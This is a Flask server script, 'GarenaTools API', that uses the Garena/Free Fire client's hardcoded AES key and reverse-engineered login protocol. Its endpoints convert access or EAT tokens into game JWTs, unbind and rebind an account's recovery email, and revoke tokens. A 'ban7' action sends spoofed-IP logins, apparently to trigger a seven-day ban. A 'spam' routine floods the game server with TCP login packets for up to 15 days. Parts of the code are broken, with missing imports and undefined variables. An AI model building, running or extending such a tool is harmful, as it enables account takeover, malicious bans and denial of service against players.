from flask import Flask, request, jsonify, session
from flask_cors import CORS
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from datetime import datetime
import base64, json, time, socket, hashlib, requests, os, threading
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

app = Flask(__name__)
app.secret_key = os.urandom(32)
CORS(app, supports_credentials=True)

# ═══════════════════════════════════════
# CONSTANTS
# ═══════════════════════════════════════
FF_VER   = "OB53"
AES_KEY  = bytes([89,103,38,116,99,37,68,69,117,104,54,37,90,99,94,56])
AES_IV   = bytes([54,111,121,90,68,114,50,50,69,51,121,99,104,106,77,37])
NK_SECRET = '1e5898ccb8dfdd921f9bdea848768b64a201'

GH = {
    'User-Agent': 'GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)',
    'Connection': 'Keep-Alive',
    'Accept-Encoding': 'gzip'
}

# ═══════════════════════════════════════
# CRYPTO
# ═══════════════════════════════════════
def aes_enc(data, key=None, iv=None):
    if isinstance(data, str): data = data.encode()
    k = key if key else AES_KEY
    v = iv  if iv  else AES_IV
    if isinstance(k, str): k = bytes.fromhex(k) if len(k)==32 else k.encode()
    if isinstance(v, str): v = bytes.fromhex(v) if len(v)==32 else v.encode()
    return AES.new(k, AES.MODE_CBC, v).encrypt(pad(data, AES.block_size))

def aes_dec(data, key=None, iv=None):
    k = key if key else AES_KEY
    v = iv  if iv  else AES_IV
    if isinstance(k, str): k = bytes.fromhex(k) if len(k)==32 else k.encode()
    if isinstance(v, str): v = bytes.fromhex(v) if len(v)==32 else v.encode()
    try:
        return unpad(AES.new(k, AES.MODE_CBC, v).decrypt(data), AES.block_size)
    except: return None

def decode_nick(enc):
    raw = base64.b64decode(enc + '=' * (-len(enc) % 4))
    return ''.join(chr(b ^ ord(NK_SECRET[i % len(NK_SECRET)])) for i, b in enumerate(raw))

def decode_jwt(token):
    seg = token.split('.')[1]
    seg += '=' * (-len(seg) % 4)
    pl = json.loads(base64.urlsafe_b64decode(seg))
    if 'nickname' in pl and isinstance(pl['nickname'], str):
        try: pl['nickname'] = decode_nick(pl['nickname'])
        except: pass
    return pl

# ═══════════════════════════════════════
# PROTOBUF (manual)
# ═══════════════════════════════════════
def varint(v):
    v = int(v); r = bytearray()
    while v > 0x7F: r.append((v & 0x7F) | 0x80); v >>= 7
    r.append(v); return bytes(r)

def sf(f, v):
    if isinstance(v, str): v = v.encode()
    return varint((f<<3)|2) + varint(len(v)) + v

def vf(f, v): return varint((f<<3)|0) + varint(int(v))

def proto_parse(data):
    res = {}; i = 0; n = len(data)
    while i < n:
        b0 = data[i]; i += 1
        fn = b0 >> 3; wt = b0 & 7
        if fn == 0: break
        if wt == 0:
            val = 0; sh = 0
            while i < n:
                b = data[i]; i += 1
                val |= (b & 0x7F) << sh
                if not (b & 0x80): break
                sh += 7
            if fn not in res: res[fn] = val
            else:
                if not isinstance(res[fn], list): res[fn] = [res[fn]]
                res[fn].append(val)
        elif wt == 2:
            ln = 0; sh = 0
            while i < n:
                b = data[i]; i += 1
                ln |= (b & 0x7F) << sh
                if not (b & 0x80): break
                sh += 7
            vb = data[i:i+ln]; i += ln
            try: vb = vb.decode('utf-8')
            except: pass
            if fn not in res: res[fn] = vb
            else:
                if not isinstance(res[fn], list): res[fn] = [res[fn]]
                res[fn].append(vb)
        elif wt == 1: i += 8
        elif wt == 5: i += 4
        else: break
    return res

def pget(d, field):
    v = d.get(field)
    if isinstance(v, list): v = v[0]
    return v

# ═══════════════════════════════════════
# GARENA CORE
# ═══════════════════════════════════════
def build_login_payload(open_id, access_token, platform):
    now = str(datetime.now())[:19]
    pl  = bytearray()
    pl += sf(3,  now)
    pl += sf(22, open_id)
    pl += sf(23, str(platform))
    pl += sf(29, access_token)
    pl += sf(99, str(platform))
    return bytes(pl)

def inspect_token(access_token):
    r = requests.get(
        f"https://100067.connect.garena.com/oauth/token/inspect?token={access_token}",
        headers={"Connection":"close","User-Agent":"GarenaMSDK/4.0.19P4(G011A ;Android 9;en;US;)"},
        timeout=12
    )
    d = r.json()
    if 'error' in d: raise Exception(f"Token lỗi: {d['error']}")
    return d['open_id'], int(d.get('platform', 8))

def major_login(open_id, access_token, platform):
    payload = build_login_payload(open_id, access_token, platform)
    enc     = aes_enc(payload)
    r = requests.post(
        "https://loginbp.ggpolarbear.com/MajorLogin",
        headers={
            'X-Unity-Version': '2018.4.11f1',
            'ReleaseVersion':  FF_VER,
            'Content-Type':    'application/x-www-form-urlencoded',
            'X-GA':            'v1 1',
            'User-Agent':      'Dalvik/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build/QKQ1.190825.002)',
            'Host':            'loginbp.ggpolarbear.com',
            'Connection':      'Keep-Alive'
        },
        data=enc, verify=False, timeout=12
    )
    if r.status_code != 200:
        raise Exception(f"MajorLogin HTTP {r.status_code}")

    # Try protobuf parse
    try:
        from MajorLogin_res_pb2 import MajorLoginRes
        res = MajorLoginRes()
        try:
            dec = aes_dec(r.content)
            res.ParseFromString(dec if dec else r.content)
        except:
            res.ParseFromString(r.content)
        if res.account_jwt:
            return res.account_jwt, bytes(res.key), bytes(res.iv)
    except: pass

    # Fallback: raw proto parse
    for raw in [r.content, aes_dec(r.content) or b'']:
        if not raw: continue
        p = proto_parse(raw)
        tok = pget(p, 8)
        if tok and isinstance(tok, str) and len(tok) > 10:
            key = pget(p, 22) or AES_KEY
            iv  = pget(p, 23) or AES_IV
            if isinstance(key, str): key = key.encode()
            if isinstance(iv,  str): iv  = iv.encode()
            return tok, key, iv

    raise Exception("Parse MajorLogin thất bại")

def get_login_data(jwt, open_id, access_token, platform):
    enc = aes_enc(build_login_payload(open_id, access_token, platform))
    r = requests.post(
        "https://clientbp.ggpolarbear.com/GetLoginData",
        headers={
            'Authorization':   f'Bearer {jwt}',
            'X-Unity-Version': '2018.4.11f1',
            'X-GA':            'v1 1',
            'ReleaseVersion':  FF_VER,
            'Content-Type':    'application/x-www-form-urlencoded',
            'User-Agent':      'Dalvik/2.1.0 (Linux; U; Android 9; G011A Build/PI)',
            'Host':            'clientbp.ggpolarbear.com',
            'Connection':      'close'
        },
        data=enc, verify=False, timeout=12
    )
    if r.status_code != 200:
        raise Exception(f"GetLoginData HTTP {r.status_code}")

    # Try protobuf
    try:
        from GetLoginData_res_pb2 import GetLoginDataRes
        res = GetLoginDataRes()
        res.ParseFromString(r.content)
        online  = res.ip_port_online  or ''
        whisper = res.ip_port_chat    or ''
    except:
        p = proto_parse(r.content)
        online  = pget(p, 14) or ''
        whisper = pget(p, 32) or ''

    if not online:
        raise Exception("Không tìm thấy địa chỉ game server")

    lc = online.rfind(':')
    online_ip, online_port = online[:lc], int(online[lc+1:])

    w_ip = w_port = None
    if whisper:
        wc = whisper.rfind(':')
        w_ip, w_port = whisper[:wc], int(whisper[wc+1:])

    return online_ip, online_port, w_ip, w_port

def build_login_packet(jwt, key, iv):
    pl  = decode_jwt(jwt)
    acc = int(pl.get('account_id', 0))
    exp = int(pl.get('exp', 0))
    exp_adj = max(exp - 28800, 0)
    enc = aes_enc(jwt.encode(), key, iv)
    header = b'\x01\x15' + acc.to_bytes(8,'big') + exp_adj.to_bytes(4,'big') + len(enc).to_bytes(4,'big')
    return header + enc

def get_jwt_from_access(access_token):
    open_id, platform = inspect_token(access_token)
    platforms = list(dict.fromkeys([platform, 2, 3, 4, 6, 8]))
    for pt in platforms:
        try:
            tok, k, v = major_login(open_id, access_token, pt)
            if tok: return tok, k, v, open_id, pt
        except: continue
    raise Exception("Tất cả platform đều thất bại")

def send_packet_tcp(ip, port, packet, timeout=8):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((ip, int(port)))
    s.sendall(packet)
    recv = b''
    try: recv = s.recv(4096)
    except socket.timeout: pass
    s.close()
    return len(recv)

# ═══════════════════════════════════════
# HELPERS
# ═══════════════════════════════════════
def ok(data=None, msg=''):
    return jsonify({'ok': True, 'data': data, 'msg': msg})

def err(msg):
    return jsonify({'ok': False, 'data': None, 'msg': msg})

def ji():
    return request.get_json(silent=True) or {}

active_spams = {} # key: uid (int), value: {at, thread, stop_event, status, ...}

def spam_loop(uid, ip, port, packet, iv_ms, end_time):
    while time.time() < end_time:
        if uid not in active_spams or active_spams[uid]['stop_event'].is_set():
            break
        try:
            send_packet_tcp(ip, port, packet, timeout=5)
            active_spams[uid]['ok'] += 1
        except:
            active_spams[uid]['fail'] += 1
        active_spams[uid]['sent'] += 1
        time.sleep(iv_ms / 1000.0)
    
    if uid in active_spams:
        active_spams[uid]['status'] = 'finished'

# ═══════════════════════════════════════
# ROUTES
# ═══════════════════════════════════════

@app.route('/', methods=['GET'])
def index(): return 'GarenaTools API OK', 200

# ═══════════════════════════════════════
# BAN 7 DAYS LOGIC (adapted from Ban7/core.py)
# ═══════════════════════════════════════

# ---------------- SimpleProtobuf Class (for Ban7)  ---------------- #
class SimpleProtobuf:
    @staticmethod
    def encode_varint(value):
        result = bytearray()
        while value > 0x7F:
            result.append((value & 0x7F) | 0x80)
            value >>= 7
        result.append(value & 0x7F)
        return bytes(result)   

    @staticmethod
    def encode_string(field_number, value):
        if isinstance(value, str): value = value.encode('utf-8')        
        result = bytearray()
        result.extend(SimpleProtobuf.encode_varint((field_number << 3) | 2))
        result.extend(SimpleProtobuf.encode_varint(len(value)))
        result.extend(value)
        return bytes(result)   

    @staticmethod
    def encode_int32(field_number, value):
        result = bytearray()
        result.extend(SimpleProtobuf.encode_varint((field_number << 3) | 0))
        result.extend(SimpleProtobuf.encode_varint(value))
        return bytes(result)   

    @staticmethod
    def create_ban_payload(open_id, access_token, platform):
        p = str(platform)
        random_ip = f"1{random.randint(0,9)}{random.randint(0,9)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        random_device = f"Google|{str(uuid.uuid4())}"
        payload = bytearray()
        payload.extend(SimpleProtobuf.encode_string(3,  datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        payload.extend(SimpleProtobuf.encode_string(4,  "free fire"))
        payload.extend(SimpleProtobuf.encode_int32 (5,  4))
        payload.extend(SimpleProtobuf.encode_string(7,  "1.123.1"))
        payload.extend(SimpleProtobuf.encode_string(8,  "Android OS 11 / API-30 (RP1A.200720.012/G991BXXU3AUL1)"))
        payload.extend(SimpleProtobuf.encode_string(19, random_device))
        payload.extend(SimpleProtobuf.encode_string(20, random_ip))
        payload.extend(SimpleProtobuf.encode_string(22, open_id))
        payload.extend(SimpleProtobuf.encode_string(23, p))
        payload.extend(SimpleProtobuf.encode_string(29, access_token))
        payload.extend(SimpleProtobuf.encode_string(99, p))
        return bytes(payload)

def ban7_logic(access_token, platform_manual=None):
    try:
        # Step 1: Inspect token
        open_id, platform = inspect_token(access_token)
        platform_ = platform_manual if platform_manual else platform

        # Step 2: MajorLogin
        payload = SimpleProtobuf.create_ban_payload(open_id, access_token, platform_)
        enc = aes_enc(payload) # Uses default AES_KEY/IV which are correct

        r = requests.post(
            "https://loginbp.ggpolarbear.com/MajorLogin",
            headers={
                "Host": "loginbp.ggpolarbear.com",
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 11; SM-G991B Build/RP1A.200720.012)",
                "Connection": "Keep-Alive",
                "Content-Type": "application/octet-stream",
                "X-GA": "v1 1",
                "X-Unity-Version": "2018.4.11f1",
                "ReleaseVersion": "OB53"
            },
            data=enc, verify=False, timeout=15
        )
        if not r.ok: return {"success": False, "message": f"MajorLogin HTTP {r.status_code}"}

        # Step 3: Parse response
        # Using existing major_login parsing logic but with the custom key/iv
        tok, k, v = None, None, None
        try:
            from MajorLogin_res_pb2 import MajorLoginRes
            res = MajorLoginRes()
            dec = aes_dec(r.content, key, iv)
            res.ParseFromString(dec if dec else r.content)
            if res.account_jwt:
                tok, k, v = res.account_jwt, bytes(res.key), bytes(res.iv)
        except: pass

        if not tok:
            p = proto_parse(aes_dec(r.content, key, iv) or r.content)
            tok = pget(p, 8)
            k = pget(p, 22) or AES_KEY
            v = pget(p, 23) or AES_IV

        if not tok: return {"success": False, "message": "Parse MajorLogin failed"}

        # Step 4: GetLoginData
        # We need the online_ip and port
        online_ip, online_port, _, _ = get_login_data(tok, open_id, access_token, platform_)

        # Step 5: Build and send packet
        # Use the specific build_login_packet but ensure timestamp/exp is handled
        packet = build_login_packet(tok, k, v)
        
        recv_len = send_packet_tcp(online_ip, online_port, packet)
        
        if recv_len > 0:
            pl = decode_jwt(tok)
            return {
                "success": True,
                "account_id": pl.get("account_id"),
                "nickname": pl.get("nickname"),
                "platform": platform_,
                "msg": "Đã gửi packet thành công!"
            }
        else:
            return {"success": False, "message": "Không nhận được phản hồi từ server"}

    except Exception as e:
        return {"success": False, "message": str(e)}

@app.route('/api', methods=['POST','OPTIONS'])
def api():
    if request.method == 'OPTIONS':
        return '', 200
    d   = ji()
    act = d.get('action','')
    uid = d.get('uid')

    # ── BAN 7 DAYS ──
    if act == 'ban7':
        at = d.get('access_token','')
        pt = d.get('platform')
        if not at: return err('Access token required')
        res = ban7_logic(at, pt)
        if res.get('success'):
            return ok(res, res['msg'])
        else:
            return err(res.get('message', 'Thất bại'))

    # ── CHECK EMAIL ──
    if act == 'check_email':
        at = d.get('access_token','')
        if not at: return err('Access token required')
        try:
            r = requests.get(
                f"https://100067.connect.garena.com/game/account_security/bind:get_bind_info?app_id=100067&access_token={at}",
                headers=GH, timeout=12
            )
            if r.status_code != 200: return err(f'API Error: {r.status_code}')
            j = r.json()
            return ok({'email': j.get('email',''), 'pending': j.get('email_to_be',''), 'countdown': j.get('request_exec_countdown',0)})
        except Exception as e: return err(str(e))

    # ── CHECK PLATFORMS ──
    elif act == 'check_platforms':
        at = d.get('access_token','')
        if not at: return err('Access token required')
        try:
            r = requests.get(
                f"https://100067.connect.garena.com/bind/app/platform/info/get?access_token={at}",
                headers=GH, timeout=12
            )
            j = r.json()
            pn = {3:'Facebook',8:'Gmail',10:'Apple',5:'VK',11:'Twitter/X',7:'Huawei'}
            linked = []
            for acc in j.get('bounded_accounts',[]):
                pid = acc.get('platform',0); ui = acc.get('user_info',{})
                if pid in pn: linked.append({'platform':pn[pid],'email':ui.get('email',''),'nick':ui.get('nickname','')})
            avail = j.get('available_platforms',[])
            main  = next((pn[pid] for pid in pn if pid not in avail), None)
            return ok({'linked': linked, 'main': main})
        except Exception as e: return err(str(e))

    # ── CANCEL EMAIL ──
    elif act == 'cancel_email':
        at = d.get('access_token','')
        if not at: return err('Access token required')
        try:
            r = requests.post(
                "https://100067.connect.garena.com/game/account_security/bind:cancel_request",
                data={'app_id':'100067','access_token':at}, headers=GH, timeout=12
            )
            return (ok(msg='Đã hủy request') if r.status_code == 200 else err('Không có request nào'))
        except Exception as e: return err(str(e))

    # ── REVOKE TOKEN ──
    elif act == 'revoke_token':
        at = d.get('access_token','')
        if not at: return err('Access token required')
        try:
            r = requests.get(f"https://100067.connect.garena.com/oauth/logout?access_token={at}", timeout=12)
            return (ok(msg='Token revoked!') if r.text.strip() == '{"result":0}' else err(f'Failed: {r.text}'))
        except Exception as e: return err(str(e))

    # ── SEND OTP ──
    elif act == 'send_otp':
        at    = d.get('access_token','')
        email = d.get('email','')
        if not at or not email: return err('Thiếu access_token hoặc email')
        try:
            r = requests.post(
                "https://100067.connect.garena.com/game/account_security/bind:send_otp",
                data={'email':email,'locale':'en_MA','region':'IND','app_id':'100067','access_token':at},
                headers=GH, timeout=12
            )
            j = r.json()
            return (ok(msg=f'OTP đã gửi tới {email}') if (r.status_code==200 and j.get('result')==0) else err(f'Gửi OTP thất bại: {r.text}'))
        except Exception as e: return err(str(e))

    # ── VERIFY OTP ──
    elif act == 'verify_otp':
        at    = d.get('access_token','')
        email = d.get('email','')
        otp   = d.get('otp','')
        if not all([at,email,otp]): return err('Thiếu thông tin')
        try:
            r = requests.post(
                "https://100067.connect.garena.com/game/account_security/bind:verify_otp",
                data={'app_id':'100067','access_token':at,'otp':otp,'email':email},
                headers=GH, timeout=12
            )
            j = r.json(); vt = j.get('verifier_token')
            return (ok({'verifier_token': vt}, 'OTP verified') if vt else err(f'OTP sai: {r.text}'))
        except Exception as e: return err(str(e))

    # ── CREATE BIND ──
    elif act == 'create_bind':
        at    = d.get('access_token','')
        email = d.get('email','')
        vt    = d.get('verifier_token','')
        sp    = d.get('sec_pw','')
        if not all([at,email,vt,sp]): return err('Thiếu thông tin')
        if not sp.isdigit() or len(sp)!=6: return err('Security code phải là 6 chữ số')
        try:
            requests.post("https://100067.connect.garena.com/game/account_security/bind:cancel_request",
                          data={'app_id':'100067','access_token':at}, headers=GH, timeout=10)
            h = hashlib.sha256(sp.encode()).hexdigest().upper()
            r = requests.post(
                "https://100067.connect.garena.com/game/account_security/bind:create_bind_request",
                data={'app_id':'100067','access_token':at,'verifier_token':vt,'secondary_password':h,'email':email},
                headers=GH, timeout=12
            )
            return (ok(msg=f'Email {email} đã thêm thành công!') if r.status_code==200 else err(f'Thất bại: {r.text}'))
        except Exception as e: return err(str(e))

    # ── VERIFY IDENTITY ──
    elif act == 'verify_identity':
        at    = d.get('access_token','')
        email = d.get('email','')
        otp   = d.get('otp','')
        sp    = d.get('sec_pw','')
        if not at or not email: return err('Thiếu access_token hoặc email')
        try:
            post = {'app_id':'100067','access_token':at,'email':email}
            if otp: post['otp'] = otp
            if sp:
                if not sp.isdigit() or len(sp)!=6: return err('Security code phải là 6 chữ số')
                post['secondary_password'] = hashlib.sha256(sp.encode()).hexdigest().upper()
            r = requests.post(
                "https://100067.connect.garena.com/game/account_security/bind:verify_identity",
                data=post, headers=GH, timeout=12
            )
            j = r.json(); it = j.get('identity_token')
            return (ok({'identity_token': it}, 'Identity verified') if it else err(f'Thất bại: {r.text}'))
        except Exception as e: return err(str(e))

    # ── CREATE UNBIND ──
    elif act == 'create_unbind':
        at = d.get('access_token','')
        it = d.get('identity_token','')
        if not at or not it: return err('Thiếu thông tin')
        try:
            r = requests.post(
                "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request",
                data={'app_id':'100067','access_token':at,'identity_token':it},
                headers=GH, timeout=12
            )
            return (ok(msg='Yêu cầu gỡ email đã gửi!') if '"result":0' in r.text.replace(' ','') else err(f'Thất bại: {r.text}'))
        except Exception as e: return err(str(e))

    # ── CREATE REBIND ──
    elif act == 'create_rebind':
        at = d.get('access_token','')
        it = d.get('identity_token','')
        vt = d.get('verifier_token','')
        ne = d.get('new_email','')
        if not all([at,it,vt,ne]): return err('Thiếu thông tin')
        try:
            r = requests.post(
                "https://100067.connect.garena.com/game/account_security/bind:create_rebind_request",
                data={'identity_token':it,'email':ne,'app_id':'100067','verifier_token':vt,'access_token':at},
                headers=GH, timeout=12
            )
            return (ok(msg='Email đã đổi thành công!') if '"result":0' in r.text.replace(' ','') else err(f'Thất bại: {r.text}'))
        except Exception as e: return err(str(e))

    # ── EAT → ACCESS TOKEN ──
    elif act == 'eat_to_access':
        raw = d.get('eat','')
        if not raw: return err('EAT required')
        try:
            eat = raw
            import re
            m = re.search(r'[?&]eat=([a-fA-F0-9]+)', raw)
            if m: eat = m.group(1)
            r   = requests.get(f"https://api-otrss.garena.com/support/callback/?access_token={eat}", allow_redirects=True, timeout=15)
            from urllib.parse import urlparse, parse_qs
            qs  = parse_qs(urlparse(r.url).query)
            at  = (qs.get('access_token') or [None])[0]
            if not at: return err('Không lấy được access_token từ EAT')
            return ok(at)
        except Exception as e: return err(str(e))

    # ── EAT → JWT ──
    elif act == 'eat_to_jwt':
        raw = d.get('eat','')
        if not raw: return err('EAT required')
        try:
            import re
            from urllib.parse import urlparse, parse_qs
            eat = re.search(r'[?&]eat=([a-fA-F0-9]+)', raw)
            eat = eat.group(1) if eat else raw
            r   = requests.get(f"https://api-otrss.garena.com/support/callback/?access_token={eat}", allow_redirects=True, timeout=15)
            qs  = parse_qs(urlparse(r.url).query)
            at  = (qs.get('access_token') or [None])[0]
            if not at: return err('Không lấy được access_token')
            tok, k, v, _, _ = get_jwt_from_access(at)
            return ok({'jwt': tok, 'decoded': decode_jwt(tok)})
        except Exception as e: return err(str(e))

    # ── ACCESS TOKEN → JWT ──
    elif act == 'access_to_jwt':
        at = d.get('access_token','')
        if not at: return err('Access token required')
        try:
            tok, k, v, _, _ = get_jwt_from_access(at)
            return ok({'jwt': tok, 'decoded': decode_jwt(tok)})
        except Exception as e: return err(str(e))

    # ── GUEST → JWT ──
    elif act == 'guest_to_jwt':
        uid_guest = d.get('uid_guest',''); pw = d.get('password','') # Đổi tên uid tránh trùng
        if not uid_guest or not pw: return err('UID and password required')
        try:
            r = requests.post(
                "https://100067.connect.garena.com/oauth/token",
                data={'grant_type':'password','app_id':'100067','account':uid_guest,'password':hashlib.md5(pw.encode()).hexdigest()},
                headers={'User-Agent':'GarenaMSDK/4.0.19P9(Redmi Note 5 ;Android 9;en;US;)','Content-Type':'application/x-www-form-urlencoded'},
                timeout=12
            )
            j = r.json()
            open_id = j.get('open_id'); at2 = j.get('access_token')
            if not open_id or not at2: return err(f'Guest auth thất bại: {r.text}')
            tok, k, v = major_login(open_id, at2, 4)
            return ok({'jwt': tok, 'decoded': decode_jwt(tok)})
        except Exception as e: return err(str(e))

    # ── LOGIN HISTORY ──
    elif act == 'login_history':
        at = d.get('access_token','')
        if not at: return err('Access token required')
        try:
            jwt, k, v, _, _ = get_jwt_from_access(at)
            pl = decode_jwt(jwt)
            region = (pl.get('lock_region') or pl.get('region') or '').upper()
            if not region: return err('Không có region trong token')
            if region == 'IND':
                domain = 'client.ind.freefiremobile.com'
            elif region in ('BR','US','NA','SAC'):
                domain = 'client.us.freefiremobile.com'
            else:
                domain = 'clientbp.ggpolarbear.com'
            phex = 'ac74dc5eb016b4ed43774eec3d13e042bd8faa337913efeb6b92ddfbf113c5cd7972e5a9fee97dc9aa8a71270cae1dc9902c91a5eeee312684d4834c003fcf7d83067c9157de749063ed0714b442666c'
            r = requests.post(
                f"https://{domain}/GetLoginHistory",
                headers={
                    'User-Agent':'Dalvik/2.1.0 (Linux; U; Android 10; V2065A Build/QP1A.190711.020)',
                    'Authorization':f'Bearer {jwt}',
                    'X-Unity-Version':'2018.4.11f1',
                    'ReleaseVersion':'OB53',
                    'Content-Type':'application/x-www-form-urlencoded'
                },
                data=bytes.fromhex(phex), verify=False, allow_redirects=False, timeout=12
            )
            if r.status_code != 200: return err(f'HTTP {r.status_code}')
            p = proto_parse(r.content)
            entries_raw = p.get(1, [])
            if not isinstance(entries_raw, list): entries_raw = [entries_raw]
            result = []
            for ed in entries_raw:
                if isinstance(ed, bytes): e = proto_parse(ed)
                elif isinstance(ed, str): e = proto_parse(ed.encode('latin-1'))
                else: continue
                ts     = e.get(1, 0)
                model  = e.get(3, '') if isinstance(e.get(3,''), str) else ''
                arch   = e.get(4, '') if isinstance(e.get(4,''), str) else ''
                lt     = e.get(5, 0)
                ltype  = 'Usual' if lt in (1,2) else ('Unusual' if lt in (3,4) else 'Unknown')
                result.append({'time': datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S') if ts else 'N/A', 'device': model, 'arch': arch, 'type': ltype})
            return ok({'entries': result})
        except Exception as e: return err(str(e))

    # ══════════════════════════════════════════════
    # ACCOUNT GUARD — SPAM LOGIN (raw TCP socket)
    # ══════════════════════════════════════════════
    elif act == 'spam_init':
        at = d.get('access_token','')
        iv = int(d.get('interval', 500))
        duration = int(d.get('duration_ms', 0))
        
        if not uid: return err('Unauthorized (missing uid)')
        if not at: return err('Access token required')

        if uid in active_spams and active_spams[uid]['status'] == 'running':
            s = active_spams[uid]
            return ok({
                'status': 'running', 
                'ip': s['ip'], 
                'port': s['port'],
                'sent': s['sent'],
                'ok': s['ok'],
                'fail': s['fail'],
                'at': s['at']
            }, 'Spam is already running')

        try:
            open_id, platform = inspect_token(at)
            jwt, key, iv_tok, _, _ = get_jwt_from_access(at)
            online_ip, online_port, w_ip, w_port = get_login_data(jwt, open_id, at, platform)
            packet = build_login_packet(jwt, key, iv_tok)
            
            max_duration = 15 * 86400 * 1000
            if duration <= 0 or duration > max_duration: duration = max_duration
            
            end_time = time.time() + (duration / 1000.0)
            stop_event = threading.Event()
            thread = threading.Thread(target=spam_loop, args=(uid, online_ip, online_port, packet, iv, end_time))
            thread.daemon = True
            
            active_spams[uid] = {
                'at': at,
                'stop_event': stop_event,
                'status': 'running',
                'sent': 0,
                'ok': 0,
                'fail': 0,
                'ip': online_ip,
                'port': online_port,
                'end_time': end_time
            }
            thread.start()
            return ok({'status': 'started', 'ip': online_ip, 'port': online_port})
        except Exception as e: return err(str(e))

    elif act == 'spam_status':
        if not uid or uid not in active_spams:
            return ok({'status': 'idle'})
        s = active_spams[uid]
        return ok({
            'status': s['status'],
            'sent': s['sent'],
            'ok': s['ok'],
            'fail': s['fail'],
            'ip': s['ip'],
            'port': s['port'],
            'at': s['at'],
            'remaining_ms': max(0, int((s['end_time'] - time.time()) * 1000))
        })

    elif act == 'spam_stop':
        if uid in active_spams:
            active_spams[uid]['stop_event'].set()
            active_spams[uid]['status'] = 'stopped'
            # Cleanup after a short delay or immediately
            del active_spams[uid]
            return ok(msg='Đã dừng và xóa tiến trình thành công')
        return err('Không có tiến trình nào đang chạy cho tài khoản này')

    return err(f'Unknown action: {act}')


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
